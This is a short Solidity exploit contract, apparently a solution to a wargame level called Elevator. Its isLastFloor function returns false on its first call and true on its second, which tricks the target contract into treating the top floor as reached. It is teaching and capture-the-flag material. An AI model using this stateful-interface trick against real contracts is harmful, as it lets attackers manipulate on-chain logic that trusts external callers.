//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorRocket is Building {
    bool public isCalled;
    Elevator public elevator;

    constructor(address target) {
        isCalled = false;
        elevator = Elevator(target);
    }

    function goToTopFloor() public {
        elevator.goTo(uint256(1));
    }

    function isLastFloor(uint256 _floor) external override returns (bool) {
        if (!isCalled) {
            isCalled = true;
            return false;
        }
        isCalled = false;
        return true;
    }
}
